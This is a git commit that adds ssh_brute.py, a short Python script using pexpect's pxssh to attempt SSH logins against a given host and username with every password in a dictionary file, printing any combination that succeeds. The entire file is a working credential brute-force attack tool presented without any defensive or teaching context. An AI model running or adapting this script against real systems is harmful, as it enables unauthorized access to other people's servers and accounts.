ab32b45145980e687b3b7f51442d97c26d2ebe87
n00B <34676016+n00B-ToT@users.noreply.github.com>
2020-01-06 17:08:03 +0800

    Add files via upload

---
+++ ssh_brute.py
@@ -0,0 +1,36 @@
+#!/usr/bin/python3
+
+#import pdb
+from sys import argv
+from pexpect import pxssh
+
+
+GREEN = "\033[32m"
+YELLOW = "\033[93m" 
+none = "\033[0m"
+
+if len(argv)!= 4:
+    print(YELLOW + "[!]Usage: {} [HOST] [USERNAME] [DICT]".format(argv[0]))
+    print(none + "\n")
+    exit()
+
+host = argv[1]
+username = argv[2]
+password = argv[3]
+
+passwords = open(password, 'r')
+
+def run(host , username , passwords):
+    for pwd in passwords:
+        try:
+                print(YELLOW+'[*]--------' + pwd + none )
+                #pdb.set_trace()
+                ssh = pxssh.pxssh()
+                ssh.login(host , username , pwd)
+                print(GREEN+host, username, pwd + none)
+        except Exception as e:
+            print(e)
+            pass
+
+
+run(host , username , passwords)
